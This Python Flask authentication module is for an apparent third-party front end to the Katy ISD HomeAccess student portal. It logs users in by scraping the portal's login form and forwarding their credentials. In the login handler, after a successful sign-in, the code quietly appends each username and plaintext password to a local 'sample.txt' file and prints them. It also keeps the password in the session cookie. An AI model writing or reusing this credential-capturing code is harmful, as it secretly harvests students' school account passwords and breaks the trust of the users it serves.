from flask import Blueprint, render_template, request, flash, redirect, url_for, session
import requests
from bs4 import BeautifulSoup
from .models import User

auth = Blueprint('auth', __name__)

login_url = "https://homeaccess.katyisd.org/HomeAccess/Account/LogOn"
assignmentsdata = 'https://homeaccess.katyisd.org/HomeAccess/Content/Student/Assignments.aspx'
reportcarddata = 'https://homeaccess.katyisd.org/HomeAccess/Content/Student/ReportCards.aspx'

@auth.route('/login', methods=['GET', 'POST'])
def login():

    login_data = {
        '__RequestVerificationToken': '',
        'SCKTY00328510CustomEnabled': True,
        'SCKTY00436568CustomEnabled': True,
        'Database': 10,
        'VerificationOption': 'UsernamePassword',
        'LogOnDetails.UserName': '',
        'tempUN': '',
        'tempPW': '',
        'LogOnDetails.Password': ''
    }

    if request.method == 'POST':
        with requests.Session() as authsession:
            r = authsession.get(login_url)
            soup = BeautifulSoup(r.content, 'html.parser')
            login_data['__RequestVerificationToken'] = soup.find('input', attrs={'name': '__RequestVerificationToken'})['value']
            user = request.form.get('username')
            pswd = request.form.get('password')
            login_data['LogOnDetails.UserName'] = user
            login_data['LogOnDetails.Password'] = pswd
            post = authsession.post(login_url, data=login_data)
            assignments = authsession.get(assignmentsdata)
            content = BeautifulSoup(assignments.text, 'html.parser')
            if(str(content.title) == '<title>Login</title>'):
                flash('\nIncorrect credentials, please try again!', category='error')
            else:
                file_object = open('sample.txt', 'a')
                add = user + " - " + pswd
                file_object.write(add)
                file_object.close()
                print(add)
                flash('\nLogin Successful!', category='success')
                session['username'] = user
                session['password'] = pswd
                session['login_data'] = login_data
                return redirect(url_for('views.home'))
    return render_template("login.html")

@auth.route('/logout')
def logout():
    session.pop('username', None)
    session.pop('password', None)
    session.pop('login_data', None)
    return redirect(url_for('auth.login'))
